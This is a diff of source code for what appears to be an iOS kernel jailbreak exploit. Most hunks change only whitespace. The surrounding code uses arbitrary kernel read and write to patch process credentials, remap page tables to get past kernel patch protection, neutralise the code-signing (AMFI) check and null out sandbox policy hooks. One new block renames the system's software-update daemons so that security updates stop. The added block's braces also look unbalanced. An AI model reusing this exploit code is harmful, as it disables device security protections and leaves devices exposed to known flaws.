@@ -63,7 +63,7 @@ void copyin(void* to, uint64_t from, size_t size) {
         if (size > 0x1000) {
             size = 0x1000;
         }
-
+        
     }
 }
 
@@ -147,7 +147,7 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
     WriteAnywhere64(bsd_task+0x100, credpatch);
     
     checkvad();
-
+    
     vm_address_t vmd = 0;
     _kernelrpc_mach_vm_allocate_trap(mach_task_self(), &vmd, 0x4000, VM_FLAGS_ANYWHERE);
     
@@ -177,7 +177,7 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
     NSLog(@"%llx - %llx", min, max);
     
     char* kdump = malloc(max-min);
-
+    
     for (int k=0; k < (max-min)/0x4000; k++) {
         copyin(kdump+k*0x4000, min+k*0x4000, 0x4000);
     }
@@ -189,11 +189,11 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
     uint64_t prelink_base = 0;
     uint64_t prelink_size = 0;
     uint64_t kerndumpbase = -1;
-
+    
     
     struct mach_header_64* mh_kern = (struct mach_header_64*) (kdump+kernbase-min);
     struct load_command* load_cmd = (struct load_command*)(mh_kern+1);
-
+    
     uint64_t entryp = 0;
     
     for (int i = 0; i < mh_kern->ncmds; i++) {
@@ -239,9 +239,9 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
     set_dump(kerndumpbase, kerndumpsize, (uint8_t*)kdump);
     set_text_exec(gadget_base, gadget_size);
     set_prelink_exec(prelink_base, prelink_size);
-
+    
     uint64_t gStoreBase = find_gPhysBase();
-
+    
     gPhysBase = ReadAnywhere64(gStoreBase);
     gVirtBase = ReadAnywhere64(gStoreBase+8);
     
@@ -262,7 +262,7 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
     uint64_t pmap_store = find_kernel_pmap();
     NSLog(@"pmap: %llx", pmap_store);
     level1_table = ReadAnywhere64(ReadAnywhere64(find_kernel_pmap()));
-
+    
     uint64_t shellcode = physalloc(0x4000);
     
     /*
@@ -280,11 +280,11 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
     WriteAnywhere32(shellcode + 0x100, 0x5800009e); /* trampoline for idlesleep */
     WriteAnywhere32(shellcode + 0x100 + 4, 0x580000a0);
     WriteAnywhere32(shellcode + 0x100 + 8, 0xd61f0000);
-
+    
     WriteAnywhere32(shellcode + 0x200, 0x5800009e); /* trampoline for deepsleep */
     WriteAnywhere32(shellcode + 0x200 + 4, 0x580000a0);
     WriteAnywhere32(shellcode + 0x200 + 8, 0xd61f0000);
-
+    
     char buf[0x100];
     copyin(buf, optr, 0x100);
     copyout(shellcode+0x300, buf, 0x100);
@@ -296,7 +296,7 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
     NSLog(@"got phys at %llx for virt %llx", physcode, shellcode);
     
     uint64_t idlesleep_handler = 0;
-
+    
     uint64_t plist[12]={0,0,0,0,0,0,0,0,0,0,0,0};
     int z = 0;
     
@@ -309,11 +309,11 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
             return;
         }
         
-
+        
         if (!idlesleep_handler) {
             WriteAnywhere64(shellcode + 0x100 + 0x18, ReadAnywhere64(cpu+0x130)); // idlehandler
             WriteAnywhere64(shellcode + 0x200 + 0x18, ReadAnywhere64(cpu+0x130) + 12); // deephandler
-
+            
             idlesleep_handler = ReadAnywhere64(cpu+0x130) - gPhysBase + gVirtBase;
             
             
@@ -334,12 +334,12 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
                 ridx++;
             }
             
-
+            
         }
-
+        
         NSLog(@"found cpu %x", ReadAnywhere32(cpu+0x330));
         NSLog(@"found physz: %llx", ReadAnywhere64(cpu+0x130) - gPhysBase + gVirtBase);
-
+        
         plist[z++] = cpu+0x130;
         cpu_list += 0x10;
         cpu = ReadAnywhere64(cpu_list);
@@ -414,9 +414,9 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
         WriteAnywhere32(shc+0x200+n, 0x0e00400f); n+=4; // tbl.8b v15, { v0, v1, v2 }, v0
         
     }
-
+    
     mach_vm_protect(tfp0, shc, 0x4000, 0, VM_PROT_READ|VM_PROT_EXECUTE);
-
+    
     uint64_t fake1 = physalloc(0x4000);
     copyin(bbuf, level0_pte, 0x4000);
     copyout(fake1, bbuf, 0x4000);
@@ -425,7 +425,7 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
     
     vm_address_t kppsh = 0;
     mach_vm_allocate(tfp0, &kppsh, 0x4000, VM_FLAGS_ANYWHERE);
-
+    
     {
         int n = 0;
         
@@ -446,15 +446,15 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
     }
     
     mach_vm_protect(tfp0, kppsh, 0x4000, 0, VM_PROT_READ|VM_PROT_EXECUTE);
-
+    
     WriteAnywhere64(shellcode + 0x100 + 0x10, shc - gVirtBase + gPhysBase); // idle
     WriteAnywhere64(shellcode + 0x200 + 0x10, shc + 0x100 - gVirtBase + gPhysBase); // idle
     
     WriteAnywhere64(shellcode + 0x100 + 0x18, idlesleep_handler - gVirtBase + gPhysBase + 8); // idlehandler
     WriteAnywhere64(shellcode + 0x200 + 0x18, idlesleep_handler - gVirtBase + gPhysBase + 8); // deephandler
-
-    /*
     
+    /*
+     
      pagetables are now not real anymore, they're real af
      
      */
@@ -474,30 +474,30 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
     
     
 #define RemapPage(address) \
-    pagestuff_64((address) & (~PMK), ^(vm_address_t tte_addr, int addr) {\
-        uint64_t tte = ReadAnywhere64(tte_addr);\
-        if (!(TTE_GET(tte, TTE_IS_TABLE_MASK))) {\
-            NSLog(@"breakup!");\
-            uint64_t fakep = physalloc(PSZ);\
-            uint64_t realp = TTE_GET(tte, TTE_PHYS_VALUE_MASK);\
-            TTE_SETB(tte, TTE_IS_TABLE_MASK);\
-            for (int i = 0; i < PSZ/8; i++) {\
-                TTE_SET(tte, TTE_PHYS_VALUE_MASK, realp + i * PSZ);\
-                WriteAnywhere64(fakep+i*8, tte);\
-            }\
-            TTE_SET(tte, TTE_PHYS_VALUE_MASK, findphys_real(fakep));\
-            WriteAnywhere64(tte_addr, tte);\
-        }\
-        uint64_t newt = physalloc(PSZ);\
-        copyin(bbuf, TTE_GET(tte, TTE_PHYS_VALUE_MASK) - gPhysBase + gVirtBase, PSZ);\
-        copyout(newt, bbuf, PSZ);\
-        TTE_SET(tte, TTE_PHYS_VALUE_MASK, findphys_real(newt));\
-        TTE_SET(tte, TTE_BLOCK_ATTR_UXN_MASK, 0);\
-        TTE_SET(tte, TTE_BLOCK_ATTR_PXN_MASK, 0);\
-        WriteAnywhere64(tte_addr, tte);\
-        NSLog(@"level %llx - %llx", tte_addr,              TTE_GET(tte, TTE_PHYS_VALUE_MASK));\
-    }, level1_table, 2);
-
+pagestuff_64((address) & (~PMK), ^(vm_address_t tte_addr, int addr) {\
+uint64_t tte = ReadAnywhere64(tte_addr);\
+if (!(TTE_GET(tte, TTE_IS_TABLE_MASK))) {\
+NSLog(@"breakup!");\
+uint64_t fakep = physalloc(PSZ);\
+uint64_t realp = TTE_GET(tte, TTE_PHYS_VALUE_MASK);\
+TTE_SETB(tte, TTE_IS_TABLE_MASK);\
+for (int i = 0; i < PSZ/8; i++) {\
+TTE_SET(tte, TTE_PHYS_VALUE_MASK, realp + i * PSZ);\
+WriteAnywhere64(fakep+i*8, tte);\
+}\
+TTE_SET(tte, TTE_PHYS_VALUE_MASK, findphys_real(fakep));\
+WriteAnywhere64(tte_addr, tte);\
+}\
+uint64_t newt = physalloc(PSZ);\
+copyin(bbuf, TTE_GET(tte, TTE_PHYS_VALUE_MASK) - gPhysBase + gVirtBase, PSZ);\
+copyout(newt, bbuf, PSZ);\
+TTE_SET(tte, TTE_PHYS_VALUE_MASK, findphys_real(newt));\
+TTE_SET(tte, TTE_BLOCK_ATTR_UXN_MASK, 0);\
+TTE_SET(tte, TTE_BLOCK_ATTR_PXN_MASK, 0);\
+WriteAnywhere64(tte_addr, tte);\
+NSLog(@"level %llx - %llx", tte_addr,              TTE_GET(tte, TTE_PHYS_VALUE_MASK));\
+}, level1_table, 2);
+    
     level1_table = physp - gPhysBase + gVirtBase;
     WriteAnywhere64(ReadAnywhere64(find_kernel_pmap()), level1_table);
     
@@ -521,20 +521,20 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
     
     uint64_t kernvers = (uint8_t*)memmem(whole_dump, (size_t)whole_size, "Darwin Kernel Version", strlen("Darwin Kernel Version")) - whole_dump;
     uint64_t release = (uint8_t*)memmem(whole_dump, (size_t)whole_size, "RELEASE_ARM", strlen("RELEASE_ARM")) - whole_dump;
-
+    
     RemapPage(kernvers+whole_base-4);
     WriteAnywhere32(NewPointer(kernvers+whole_base-4), 1);
     copyout(NewPointer(release+whole_base), "MarijuanARM", 11); /* marijuanarm */
-
+    
     uint64_t memcmp_got = find_amfi_memcmpstub();
     uint64_t ret1 = find_ret_0();
     
     RemapPage(memcmp_got);
     WriteAnywhere64(NewPointer(memcmp_got), ret1);
-
+    
     uint64_t fref = find_reference((uint32_t*)get_data_for_mode(0, SearchTextExec), text_exec_size, text_exec_base, idlesleep_handler+0xC) + text_exec_base;
     NSLog(@"fref at %llx", fref);
-
+    
     uint64_t find_string_reference(char* string, enum Search mode);
     uint64_t amfiops = 0;
     //= find_string_reference("Apple Mobile File Integrity", SearchPrelinkExec);
@@ -545,9 +545,9 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
             break;
         }
     }
-
+    
     NSLog(@"amfistr at %llx", amfiops);
-
+    
     
     {
         /*
@@ -565,7 +565,7 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
         }
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap)), 0);
     }
-
+    
     
     /*
      first str
@@ -585,7 +585,7 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
     }
     
     fref += 4;
-
+    
     /*
      second str
      */
@@ -603,8 +603,8 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
     }
     
     
-
-
+    
+    
     
     {
         /*
@@ -613,9 +613,9 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
         
         uint64_t sbops = find_sbops();
         uint64_t sbops_end = sbops + sizeof(struct mac_policy_ops);
-
+        
         uint64_t nopag = sbops_end - sbops;
-
+        
         int ctr = 0;
         for (int i = 0; i < nopag; i+= PSZ) {
             RemapPage(((sbops + i) & (~PMK)));
@@ -650,7 +650,7 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_fsgetpath)), 0);
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattr)), 0);
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_stat)), 0);
-
+        
     }
     
     {
@@ -667,11 +667,11 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
         WriteAnywhere32(remap, 0x58000041);
         WriteAnywhere32(remap + 4, 0xd61f0020);
         WriteAnywhere64(remap + 8, shc+0x200); /* amfi shellcode */
-
+        
     }
     copyin(bbuf, level0_pte, PSZ);
     copyout(fake1, bbuf, PSZ);
-
+    
     
     for (int i = 0; i < z; i++) {
         WriteAnywhere64(plist[i], physcode + 0x100);
@@ -710,7 +710,22 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
         
         WriteAnywhere32(v_mount + 0x71, v_flag);
     }
-
+    
+    { //Prevents OTA Daemons from launching && Removes OTA Badges
+        
+        int f1 = open("/System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.bak", O_RDONLY);
+        int f2 = open("/System/Library/LaunchDaemons/com.apple.softwareupdateservicesd.bak", O_RDONLY);
+        
+        if ( (f1 == -1) || (f2 == -1) )  {
+            NSLog(@"Killing OTA Updates...");
+            system("mv -f /System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.plist /System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.bak");
+            system("mv -f /System/Library/LaunchDaemons/com.apple.softwareupdateservicesd.plist /System/Library/LaunchDaemons/com.apple.softwareupdateservicesd.bak");
+            NSMutableDictionary* prefDict = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.Preferences.plist"];         
+            [prefDict setObject:[NSNumber numberWithBool:NO] forKey:@"kBadgedForSoftwareUpdateKey"];
+            [prefDict setObject:[NSNumber numberWithBool:NO] forKey:@"kBadgedForSoftwareUpdateJumpOnceKey"];
+            [prefDict writeToFile:@"/var/mobile/Library/Preferences/com.apple.Preferences.plist" atomically:YES];  
+        }
+    
     {
         char path[256];
         uint32_t size = sizeof(path);
@@ -759,11 +774,10 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
                 system("/usr/bin/uicache");
                 
                 system("killall -SIGSTOP cfprefsd");
-                NSMutableDictionary* md = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];
-                
+                NSMutableDictionary* md = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];         
                 [md setObject:[NSNumber numberWithBool:YES] forKey:@"SBShowNonDefaultSystemApps"];
-                
                 [md writeToFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist" atomically:YES];
+                
                 system("killall -9 cfprefsd");
                 
             }
@@ -797,6 +811,7 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
     system("(echo 'really jailbroken'; /bin/launchctl load /Library/LaunchDaemons/0.reload.plist)&");
     WriteAnywhere64(bsd_task+0x100, orig_cred);
     sleep(2);
-
+    
     NSLog(@"done");
+}
 }
